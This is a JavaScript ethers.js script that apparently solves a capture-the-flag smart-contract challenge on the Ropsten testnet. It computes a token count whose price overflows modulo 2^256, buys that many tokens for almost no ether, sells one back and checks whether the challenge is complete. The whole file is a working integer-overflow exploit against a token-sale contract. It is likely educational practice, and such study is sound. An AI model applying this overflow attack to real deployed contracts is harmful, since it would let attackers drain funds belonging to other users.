import {Contract, ethers} from 'ethers';
import { INFURA_ROPSTEN_URL, privateKey } from '../constant.js';
const provider = new ethers.providers.JsonRpcProvider(INFURA_ROPSTEN_URL)
const wallet = new ethers.Wallet(privateKey, provider)



const main = async() =>{ 

    const contractaddress = "0x86308497c2d176E1A76CCC1487e95060a96Ab8d8";
    const contractABI = [
        "function isComplete() public view returns (bool)",
        "function buy(uint256 numTokens) public payable",
        "function sell(uint256 numTokens) public"
    ];
    const contract = new ethers.Contract(contractaddress,contractABI, wallet);
    
    

    // 2**256 = 0  value = (2**256/10**18 +1)*10**18%2**256
    const max = ethers.BigNumber.from(2n**256n);
    const t = ethers.utils.parseUnits("1", "ether");
    const tvalue =ethers.BigNumber.from( max.div(t).add(1));
    const values = tvalue.mul(t).mod(max);
    // console.log(values.toString());


    console.log(await contract.isComplete(), "############");



    const options = {value:ethers.utils.parseUnits(values.toString(), "wei"), 
                    gaslimit:ethers.utils.parseEther("1")
                }; 

    const tx = await contract.buy(tvalue, options);


    console.log("交易结果", tx)

    const tx2 = await contract.sell(1, {gasLimit: 5000000});
    console.log(tx2);

    await tx.wait()

    console.log(await contract.isComplete(), "@@@@@@@@@@@@@");


}

main()






